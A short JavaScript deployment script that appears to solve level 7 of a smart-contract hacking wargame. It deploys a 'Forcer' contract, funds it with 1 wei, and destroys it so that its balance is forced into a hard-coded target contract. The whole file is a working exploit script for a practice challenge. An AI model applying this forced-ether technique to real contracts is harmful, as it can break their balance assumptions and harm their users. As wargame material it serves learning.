const level7 = async (deployer, Forcer) => {

    const targetAddress = '0xefced4e44ca9c9496b89764a505791eee5e8fd49';

    console.log(`Exploiting Level7 target ${targetAddress}...`);

    console.log('Deploying Forcer contract...');
    const forcer = await deployer.deploy(Forcer);
    console.log('Sending 1 Wei to the contract...');
    await forcer.sendTransaction({value: 1});
    console.log('Removing the contract, sending the balance to the target...');
    await forcer.close(targetAddress);
};

module.exports = level7;